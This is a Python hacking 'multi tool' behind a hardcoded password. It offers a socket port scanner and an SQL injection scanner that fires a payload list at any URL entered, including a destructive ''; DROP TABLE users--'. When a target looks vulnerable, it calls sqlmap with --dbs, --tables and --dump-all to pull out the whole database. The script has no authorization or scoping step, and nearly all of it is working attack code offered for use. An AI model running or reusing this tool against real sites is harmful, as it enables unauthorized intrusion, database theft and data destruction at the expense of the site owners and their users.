#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import random
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Login credentials
USERNAME = "mrzxx"
PASSWORD = "123456"

# ASCII Art
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_welcome():
    clear_screen()
    print(Fore.GREEN + "=" * 60)
    print(WELCOME_ASCII)
    print(Fore.GREEN + "=" * 60)
    time.sleep(2)

def login():
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.GREEN + " " * 20 + "LOGIN SYSTEM")
    print(Fore.GREEN + "=" * 50)
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE)
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE)
        
        if username == USERNAME and password == PASSWORD:
            return True
        else:
            attempts -= 1
            print(Fore.RED + f"[!] Wrong credentials! {attempts} attempts remaining")
            time.sleep(1)
    
    return False

def port_scanner():
    clear_screen()
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + """
  ____            _     ____                  _           
 |  _ \ ___  _ __| |_  / ___|  ___ _ __   ___| |_ ___ _ __ 
 | |_) / _ \| '__| __| \___ \ / __| '_ \ / __| __/ _ \ '__|
 |  __/ (_) | |  | |_   ___) | (__| | | | (__| ||  __/ |   
 |_|   \___/|_|   \__| |____/ \___|_| |_|\___|\__\___|_|   
    """)
    print(Fore.GREEN + "=" * 60)
    
    target = input(Fore.YELLOW + "[?] Enter target IP or domain: " + Fore.WHITE)
    port_range = input(Fore.YELLOW + "[?] Enter port range (e.g., 1-1000): " + Fore.WHITE)
    
    try:
        start_port, end_port = map(int, port_range.split('-'))
    except:
        print(Fore.RED + "[!] Invalid port range format!")
        input(Fore.YELLOW + "[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Scanning ports...")
    print(Fore.CYAN + f"[+] Target: {target}")
    print(Fore.CYAN + f"[+] Port range: {start_port}-{end_port}")
    print(Fore.GREEN + "-" * 60)
    
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Port {port}: OPEN")
                open_ports.append(port)
            else:
                print(Fore.RED + f"[-] Port {port}: CLOSED")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Port {port}: ERROR - {str(e)}")
        finally:
            sock.close()
    
    print(Fore.GREEN + "-" * 60)
    print(Fore.CYAN + f"[+] Scan completed!")
    print(Fore.CYAN + f"[+] Total open ports: {len(open_ports)}")
    if open_ports:
        print(Fore.CYAN + f"[+] Open ports: {', '.join(map(str, open_ports))}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def sql_injector():
    clear_screen()
    print(Fore.GREEN + "=" * 60)
    print(Fore.CYAN + """
  ____  _       _       ___       _            _   
 / ___|| | ___ | |__   |_ _|_ __ | |_ ___  ___| |_ 
 \___ \| |/ _ \| '_ \   | || '_ \| __/ _ \/ __| __|
  ___) | | (_) | |_) |  | || | | | ||  __/\__ \ |_ 
 |____/|_|\___/|_.__/  |___|_| |_|\__\___||___/\__|
    """)
    print(Fore.GREEN + "=" * 60)
    
    url = input(Fore.YELLOW + "[?] Enter target URL (e.g., http://example.com/page.php?id=1): " + Fore.WHITE)
    
    if not url.startswith('http'):
        print(Fore.RED + "[!] URL must start with http:// or https://")
        input(Fore.YELLOW + "[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Testing SQL Injection...")
    print(Fore.CYAN + f"[+] Target: {url}")
    print(Fore.GREEN + "-" * 60)
    
    # Test payloads
    payloads = [
        "'",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
    ]
    
    vulnerable = False
    
    for i, payload in enumerate(payloads):
        print(Fore.YELLOW + f"[*] Testing payload {i+1}/{len(payloads)}...")
        
        # Create test URL
        if "?" in url:
            test_url = url + payload
        else:
            test_url = url + "?id=" + payload
        
        try:
            response = requests.get(test_url, timeout=5)
            
            # Check for SQL error messages
            error_indicators = [
                "sql",
                "SQL",
                "syntax",
                "Syntax",
                "mysql",
                "MySQL",
                "oracle",
                "Oracle",
                "database",
                "Database",
                "error",
                "Error",
                "warning",
                "Warning",
                "unclosed",
                "Unclosed",
                "quote",
                "Quote"
            ]
            
            for indicator in error_indicators:
                if indicator in response.text:
                    print(Fore.GREEN + f"[+] VULNERABLE with payload: {payload}")
                    print(Fore.GREEN + f"[+] Error indicator found: {indicator}")
                    vulnerable = True
                    break
            
            # Check for different content length
            if len(response.text) != len(requests.get(url, timeout=5).text):
                print(Fore.GREEN + f"[+] POSSIBLE VULNERABILITY with payload: {payload}")
                print(Fore.GREEN + f"[+] Different response length detected")
                vulnerable = True
        
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Error testing payload: {str(e)}")
    
    if vulnerable:
        print(Fore.GREEN + "\n[+] SQL Injection vulnerability found!")
        
        # Ask if user wants to use sqlmap
        use_sqlmap = input(Fore.YELLOW + "\n[?] Do you want to use sqlmap for automated exploitation? (y/n): " + Fore.WHITE).lower()
        
        if use_sqlmap == 'y':
            print(Fore.CYAN + "\n[+] Running sqlmap...")
            print(Fore.CYAN + "[+] This may take some time...")
            
            sqlmap_commands = [
                ["sqlmap", "-u", url, "--batch", "--dbs"],
                ["sqlmap", "-u", url, "--batch", "--current-db"],
                ["sqlmap", "-u", url, "--batch", "--tables"],
                ["sqlmap", "-u", url, "--batch", "--dump-all"],
            ]
            
            for cmd in sqlmap_commands:
                print(Fore.YELLOW + f"\n[*] Running: {' '.join(cmd)}")
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    print(Fore.CYAN + result.stdout)
                    if result.stderr:
                        print(Fore.RED + result.stderr)
                except FileNotFoundError:
                    print(Fore.RED + "[!] sqlmap is not installed or not in PATH")
                    print(Fore.YELLOW + "[!] Install sqlmap: pip install sqlmap")
                    break
                except Exception as e:
                    print(Fore.RED + f"[!] Error running sqlmap: {str(e)}")
                    break
    else:
        print(Fore.RED + "\n[-] No SQL Injection vulnerabilities found")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def main_menu():
    while True:
        clear_screen()
        print(MAIN_ASCII)
        print(Fore.GREEN + "=" * 60)
        print(Fore.CYAN + " " * 20 + "MULTI TOOL SYSTEM")
        print(Fore.GREEN + "=" * 60)
        print(Fore.YELLOW + "\n[1] SQL Injection Scanner + sqlmap")
        print(Fore.YELLOW + "[2] Port Scanner")
        print(Fore.YELLOW + "[3] Exit")
        print(Fore.GREEN + "-" * 60)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE)
        
        if choice == "1":
            sql_injector()
        elif choice == "2":
            port_scanner()
        elif choice == "3":
            print(Fore.CYAN + "\n[+] Thank you for using this tool!")
            print(Fore.CYAN + "[+] Exiting...")
            time.sleep(1)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

def main():
    try:
        # Show welcome screen
        show_welcome()
        
        # Login
        if not login():
            print(Fore.RED + "\n[!] Maximum login attempts reached!")
            print(Fore.RED + "[!] Access denied!")
            sys.exit(1)
        
        # Show main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Check dependencies
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required dependencies...")
        os.system("pip install colorama requests")
        print(Fore.GREEN + "[+] Dependencies installed!")
        time.sleep(2)
    
    main()
